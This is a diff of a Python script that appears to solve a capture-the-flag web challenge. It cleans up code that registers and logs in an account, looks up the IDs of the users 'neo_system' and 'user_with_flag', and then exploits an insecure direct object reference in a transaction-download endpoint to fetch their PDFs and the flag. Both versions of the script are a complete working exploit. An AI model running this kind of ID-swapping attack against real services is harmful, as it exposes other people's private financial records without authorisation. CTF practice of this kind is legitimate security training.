@@ -18,63 +18,66 @@ session.get(base_url)
 register_url = f"{base_url}/api/v2/auth/register"
 
 # Registration data
-payload = {
+register_payload = {
     "username": "newuser",
     "email": "newemail@test.com",
     "password": "newnewnew"
 }
-payloadhe = {
-        "Content-Type": "application/json"
+headers = {
+    "Content-Type": "application/json"
 }
 
-# Send POST request
-response = session.post(register_url, json=payload,headers=payloadhe)
+# Send POST request for registration
+response = session.post(register_url, json=register_payload, headers=headers)
+print("+++++ Registration completed. Now switching to login... +++++")
 
-# Output result
-print("+++++++++++++++++Register Done Now will switch to login:+++++++++")
+# Login request
+login_url = f"{base_url}/api/v2/auth/login"
+login_response = session.post(login_url, json=register_payload)
 
-loginurl = f"{base_url}/api/v2/auth/login"
-login = session.post(loginurl,json=payload)
-if login.status_code == 200 :
-    print("Login Done")
+if login_response.status_code == 200:
+    print("Login successful.")
 else:
-    "something wrong"
-check = f"{base_url}/api/v2/auth/inquire?username=neo_system"
-getid = session.get(check)
-if getid.status_code == 200:
-    print("+++++++++++++++++++ we get the username id of neo_system we see it's on secreen on main page dasboard")
-    res = getid.json()
-    adminid = res["_id"]
-    print(f"our target id is _ {adminid}")
-print("So from that we will targeting now /api/v1/transactions/download-transactions but first lets observe something ")
-new = f"{base_url}/api/v1/transactions/download-transactions"
-r = session.post(new)
-print("now check the problem")
-t =r.content
-print(f"{t}")
-print("so we need to proivde id")
-new = f"{base_url}/api/v1/transactions/download-transactions"
-ids={
-    "_id":adminid
-}
-r = session.post(new,json=ids)
-pdf_bytes = r.content  # or whatever variable holds b'%PDF...'
-with open("output.pdf", "wb") as f:
-    f.write(pdf_bytes)
+    print("Something went wrong during login.")
 
-print("chcek the folder there is new pdf is have usercalled  user_with_flag ")
-print("so from that we will start targeting the user with same process above")
-check = f"{base_url}/api/v2/auth/inquire?username=user_with_flag"
-getid = session.get(check)
-res = getid.json()
-adminid = res["_id"]
-print(f"our target id is _ {adminid} and that will extract us the flag")
-new = f"{base_url}/api/v1/transactions/download-transactions"
-ids={
-    "_id":adminid
-}
-r = session.post(new,json=ids)
-pdf_bytes = r.content  # or whatever variable holds b'%PDF...'
+# Check user ID for 'neo_system'
+inquire_url = f"{base_url}/api/v2/auth/inquire?username=neo_system"
+inquire_response = session.get(inquire_url)
+
+if inquire_response.status_code == 200:
+    print("+++++ Successfully retrieved the username ID for 'neo_system'. Check the main page dashboard. +++++")
+    res = inquire_response.json()
+    admin_id = res["_id"]
+    print(f"Target ID: {admin_id}")
+
+# Target /api/v1/transactions/download-transactions
+print("Targeting /api/v1/transactions/download-transactions... Observing initial response.")
+transactions_url = f"{base_url}/api/v1/transactions/download-transactions"
+initial_response = session.post(transactions_url)
+print("Initial response content:")
+print(initial_response.content)
+print("It seems we need to provide an ID.")
+
+# Request with admin ID
+payload = {"_id": admin_id}
+pdf_response = session.post(transactions_url, json=payload)
+
+# Save the first PDF
+with open("output.pdf", "wb") as f:
+    f.write(pdf_response.content)
+print("Check the folder. 'output.pdf' contains a user called 'user_with_flag'.")
+
+# Target 'user_with_flag'
+flag_inquire_url = f"{base_url}/api/v2/auth/inquire?username=user_with_flag"
+flag_inquire_response = session.get(flag_inquire_url)
+flag_res = flag_inquire_response.json()
+flag_id = flag_res["_id"]
+print(f"Target ID for flag extraction: {flag_id}")
+
+# Download flag PDF
+flag_payload = {"_id": flag_id}
+flag_pdf_response = session.post(transactions_url, json=flag_payload)
+
 with open("flag.pdf", "wb") as f:
-    f.write(pdf_bytes)
-print("flag in flag.pdf ")
+    f.write(flag_pdf_response.content)
+print("Flag saved in 'flag.pdf'.")
